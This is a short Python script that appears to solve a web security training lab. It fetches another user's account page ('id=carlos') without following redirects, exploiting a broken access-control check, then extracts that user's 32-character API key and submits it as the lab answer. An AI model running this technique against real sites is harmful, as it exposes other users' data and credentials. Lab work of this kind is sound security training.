import requests
import sys
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
red_url = burp_url + '/my-account?id=carlos'
burp_headers = {}
response2 = requests.get(red_url, headers=burp_headers, allow_redirects=False)

find_api_key = re.search(r'[A-Za-z0-9]{32}',response2.text)
api_key = find_api_key.group(0)


burp_headers = {}
burp_data = {"answer": api_key}
requests.post(burp_url+'/submitSolution', headers=burp_headers, data=burp_data)
